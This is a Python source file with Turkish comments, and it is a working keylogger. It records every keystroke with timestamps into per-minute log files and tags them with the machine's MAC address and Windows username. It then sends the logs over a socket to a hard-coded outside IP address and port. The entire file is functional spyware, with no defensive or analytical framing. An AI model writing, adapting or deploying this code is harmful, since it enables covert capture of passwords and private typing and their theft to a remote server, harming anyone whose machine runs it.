from pynput.keyboard import Listener
import time
import datetime
import math

import socket
import json

import os
import re
import uuid
macAddress = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
winUsername = os.getlogin()

LastSendMinutes = 0
#Sunucu bağlantı bilgilerimiz
host = '193.164.7.25'
port = 4000
#Logların tutulacağı klasör yolu
logFile = "loglar"
#Klasör oluşturma
if not os.path.isdir(logFile):
    os.makedirs(logFile)

#Klavye eylemi
def PressEvent(Key):
    #Unixtime'yi dakikaya çeviren fonksiyonumzudan dosya ismi oluşturuyoruz
    FileTime = GetUnixMinutes()
    #Dosyayı oluşturuyoruz, varsa açıyoruz
    with open(logFile + "/" + FileTime + ".txt" , "a" , encoding="utf-8") as file:
        k = str(Key).replace("'", "")
        #Kayıt edeceğimiz verinin başına tarih ekliyoruz
        t = "\n[" + GetDate() + "] "
        #Basılan tuş silme tuşu mu?
        if k.find("backspace") > 0:
            file.write(t + "(KEY.BACKSPACE)")
        #Basılan tuş boşluk tuşu mu?
        elif k.find("space") > 0:
            file.write(t + " ")
        #Basılan tuş özel bir tuş mu?
        elif k.find("Key") >= 0:
            file.write(t + "(" + k.upper() + ")")
        else:
            file.write(t + k)
    #Son gönderdiğimiz dosyadan sonra yeni dosya oluşmuş mu kontrolü
    if(int(FileTime) > LastSendMinutes + 1):
        TimeIsDone(int(FileTime), LastSendMinutes)

def GetUnixMinutes():
    #Dosyalama sistemi için unixtime'yi dakikaya çevirdik ve dakikalık dosyalar almamıza olanak sağladı
    return str(math.floor(int(time.time()) / 60))

def GetDate():
    #Verilerin başına eklemek için tarih formatı
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def TimeIsDone(F, L):
    global LastSendMinutes
    path = logFile
    #Kayıtların tutulduğu klasördeki tüm birikmiş, tamamlanan dosyaları çekiyoruz
    dir_list = os.listdir(path)
    b = 0
    for x in dir_list:
        c = x.replace(".txt", "")
        p = path + "/" + x
        #Dosya isimleri unixtime'nin dakikaya çevirilmiş hali olduğu için o sayıyı kayıt edip son kontrolleri yapıyoruz
        d = int(c)
        if d < F:
            if d > L:
                if d > b: b = d
                #Eğerki dosyamız tamamlanmış ve önceden gönderilmeyen bir dosya ise dosyamızı hazırlıyoruz
                file = open(p, encoding="utf8")
                #Dosyayı sunucumuza bağlantı kuran fonksiyona iletiyoruz
                SendSocketMessage("MinuteTimer", { c: file.read() })
                file.close()
            else:
                os.remove(p)
    LastSendMinutes = b
    return

#Sunucuya mesaj gönderme fonksiyonumuz
def SendSocketMessage(T, M):
    global host, port
    #Sunucuya bağlantı kuruyoruz
    client_socket = socket.socket()
    client_socket.connect((host, port))
    #Sunucunun karşılayacağı mesaj için sabit yapı kullanıyoruz
    message = {
        "mac": macAddress,
        "win_username": winUsername,
        "type": T,
        "data": M
    }
    #Sunucuya veriyi iletiyoruz ve bağlantıyı koparıyoruz
    client_socket.send(json.dumps(message).encode('utf8'))
    client_socket.close()

#Klavye dinleyicisi
with Listener(on_press=PressEvent) as listener:
    listener.join()
